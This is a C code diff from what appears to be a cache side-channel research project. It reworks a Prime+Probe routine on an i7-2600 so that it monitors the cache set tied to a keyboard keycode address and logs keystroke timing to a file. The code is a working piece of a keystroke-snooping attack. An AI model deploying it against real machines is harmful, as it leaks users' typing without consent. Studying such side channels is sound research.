@@ -153,11 +153,12 @@ uint64_t *profile_slices(int set) {
   char filename[20];
 
   uint64_t *size = malloc(4 * sizeof(uint64_t));
+  int threshold = threshold_from_flush((void *)es_list[0]->head);
   for (int i = 0; i < 4; i++) {
     int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
     printf("testing slice index: %d\n", slice);
     prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, hit_times, 1024 * 1024,
-                timestamps, &size[slice]);
+                timestamps, &size[slice], threshold);
     print_probe_result(hit_times, 1024 * 1024, 64, 64);
     sprintf(filename, "output%d.bin", slice);
     flush_timestamps(timestamps, size[slice], filename);
@@ -170,12 +171,15 @@ void measure_keystroke() {
   int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
   int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
   int eslist_index = get_evset_index(slice);
-  while (1) {
-    uint8_t probemap[1024 * 1024];
-    uint64_t timestamps[64 * 64];
-    uint64_t size;
+  uint8_t probemap[1024 * 1024];
+  uint64_t keystrokes[64 * 64];
+  uint64_t size;
+  int threshold = threshold_from_flush((void *)es_list[0]->head);
+  for (int i = 0; i < 10; i++) {
+    // takes around 1s to fill up 1 MB buffer
     prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY, probemap,
-                1024 * 1024, timestamps, &size);
+                1024 * 1024, keystrokes, &size, threshold);
+    flush_timestamps(keystrokes, size, "keystrokes.bin");
   }
 }
 
@@ -183,16 +187,17 @@ int main() {
   // test_eviction_set();
   // test_covert_channel();
   // test_eviction_and_pp();
-  signal(SIGINT, handle_sigint);
-  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
+  // signal(SIGINT, handle_sigint);
+  // int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
   init_mapping();
-  uint64_t *timestamp_sizes = profile_slices(set);
-  uint64_t slice_zero_times[timestamp_sizes[0]];
-  printf("%lu\n", timestamp_sizes[0]);
-  read_binary("output0.bin", slice_zero_times, timestamp_sizes[0]);
-  // for (uint64_t i = 0; i < timestamp_sizes[0]; i++) {
-  //   printf("%lu\n", slice_zero_times[i]);
-  // }
-  free(timestamp_sizes);
+  // uint64_t *timestamp_sizes = profile_slices(set);
+  // uint64_t slice_zero_times[timestamp_sizes[0]];
+  // printf("%lu\n", timestamp_sizes[0]);
+  // read_binary("output0.bin", slice_zero_times, timestamp_sizes[0]);
+  // free(timestamp_sizes);
+  es_list = get_all_slices_eviction_sets(mapping_start, 428);
+  uint64_t start_time = __rdtscp(&core_id);
+  measure_keystroke();
+  printf("%llu\n", __rdtscp(&core_id) - start_time);
   return 0;
 }
